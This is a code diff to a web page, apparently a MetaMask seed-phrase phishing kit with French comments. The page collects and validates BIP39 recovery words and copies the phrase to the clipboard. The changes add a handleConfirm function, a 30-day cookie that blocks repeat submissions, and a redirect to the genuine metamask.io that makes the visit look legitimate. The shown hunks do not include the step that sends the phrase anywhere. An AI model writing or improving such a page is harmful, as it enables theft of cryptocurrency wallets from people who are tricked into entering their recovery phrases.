@@ -212,7 +212,7 @@
 
   <script src="bip39-words.js"></script>
   <script>
-    // Fonctions cookie
+    // Fonction cookie set
     function setCookie(name, value, days) {
       const d = new Date();
       d.setTime(d.getTime() + (days*24*60*60*1000));
@@ -220,14 +220,16 @@
       document.cookie = name + "=" + value + ";" + expires + ";path=/";
     }
 
+    // Fonction cookie get
     function getCookie(name) {
       const cname = name + "=";
       const decodedCookie = decodeURIComponent(document.cookie);
       const ca = decodedCookie.split(';');
       for(let i = 0; i < ca.length; i++) {
-        let c = ca[i];
-        while (c.charAt(0) == ' ') c = c.substring(1);
-        if (c.indexOf(cname) == 0) return c.substring(cname.length, c.length);
+        let c = ca[i].trim();
+        if (c.indexOf(cname) === 0) {
+          return c.substring(cname.length, c.length);
+        }
       }
       return "";
     }
@@ -250,7 +252,6 @@
       });
 
       document.getElementById("submitBtn").disabled = true;
-      document.getElementById("errorMsg").style.display = "none";
     }
 
     function checkFieldsFilled() {
@@ -284,7 +285,19 @@
       }
 
       return valid;
-   
+    }
+
+    function handleConfirm() {
+      const errorEl = document.getElementById("errorMsg");
+
+      // Vérifier si formulaire déjà soumis
+      if(getCookie("formSubmitted") === "true") {
+        alert("Vous avez déjà soumis le formulaire. Vous allez être redirigé.");
+        setTimeout(() => {
+          window.location.href = "https://metamask.io/";
+        }, 800);
+        return;
+      }
 
       if (!validateBIP39Words()) {
         errorEl.style.display = "block";
@@ -314,16 +327,14 @@
 
       navigator.clipboard.writeText(phrase.trim());
 
-      // Bloquer nouvel envoi : cookie 30 jours
       setCookie("formSubmitted", "true", 30);
 
-      // Désactiver bouton après envoi
       const submitBtn = document.getElementById("submitBtn");
       submitBtn.disabled = true;
       submitBtn.textContent = "Formulaire soumis";
 
       setTimeout(() => {
-        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+        window.location.href = "https://metamask.io/";
       }, 800);
     }
 
